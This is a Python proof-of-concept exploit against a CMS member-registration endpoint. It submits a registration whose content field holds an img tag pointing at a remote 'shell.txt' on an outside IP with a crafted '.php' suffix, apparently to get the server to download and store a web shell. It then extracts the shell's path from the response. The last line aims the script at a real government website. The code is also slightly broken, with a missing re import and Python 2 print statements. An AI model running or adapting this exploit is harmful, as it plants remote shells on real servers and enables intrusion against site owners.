import requests


def poc(url):
    u = '{}/index.php?m=member&c=index&a=register&siteid=1'.format(url)
    headers = {}
    headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0'
    data = {
        'siteid': '1',
        'modelid': '1',
        'username': 'jbcdskljfldas',
        'password': 'gjdsakfsdajcv',
        'email': 'yangglee@126.com',
        'info[content]': '<img src=http://35.198.207.206:81/shell.txt%3F.php%23.jpg>',
        'dosubmit': '1',
    }
    rep = requests.post(u, data=data, headers=headers)
    print(rep.content)
    print
    print
    shell = ''
    re_result = re.findall(r'&lt;img src=(.*)&gt', rep.content)
    if len(re_result):
        shell = re_result[0]
        print shell

poc('http://www.gzmw.gov.cn')
